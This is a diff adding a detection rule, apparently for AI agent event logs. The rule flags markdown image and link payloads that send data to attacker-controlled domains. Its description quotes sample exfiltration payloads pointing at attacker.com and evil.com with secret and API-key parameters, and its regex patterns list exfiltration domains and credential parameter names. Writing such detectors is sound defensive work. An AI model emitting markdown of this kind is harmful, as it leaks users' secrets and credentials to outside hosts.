@@ -1,0 +1,31 @@
+title: Direct Markdown Image/Link Exfil Payload (attacker.com / evil.com)
+id: 19f54ddc-4e53-4c76-bc63-6bd2a6b31c2d
+status: experimental
+level: critical
+description: |-
+  Detects markdown image and link syntax that directly embeds attacker-controlled domains (attacker.com, evil.com, exfil.*, collect.*) with exfiltration-specific query parameters. Unlike ATR-2026-00501 (which detects instruction patterns) and ATR-2026-01453 (which detects the base64-QUERY template), this rule detects the artifact itself when it appears directly in input — e.g. a raw payload like "![](https://attacker.com/collect?data=SENSITIVE_DATA)" or "[Click here](https://evil.com/?secret=API_KEY)". These appear as standalone injection payloads or embedded in social-engineering text.
+
+  Adapted from Agent Threat Rules ATR-2026-01454 (MIT).
+author: ATR Community (adapted)
+date: '2026-06-12'
+references:
+- https://agentthreatrule.org/en/rules/ATR-2026-01454
+tags:
+- attack.exfiltration
+- atlas.aml.t0024
+- owasp.asi01
+- owasp.llm01
+- owasp.llm02
+logsource:
+  product: ai_agent
+  category: agent_events
+detection:
+  sel_0:
+    content|re: (?i)!\[[^\]]{0,60}\]\(https?://(?:attacker|evil|exfil|collect|malicious|pwn|steal|grab|harvest)\.[a-z]{2,}[^)]{0,200}\)
+  sel_1:
+    content|re: (?i)!\[[^\]]{0,60}\]\(https?://[a-z0-9._%-]+\.[a-z]{2,}[^)]{0,100}\?(?:data|secret|payload|api[_-]?key|token|credential|auth|session|cookie)=[A-Z_]{3,}
+  condition: 1 of sel_*
+falsepositives:
+- Security research documentation showing these payloads in code blocks as examples
+- Legitimate use of collect.* or analytics domains without exfiltration parameters
+action: report
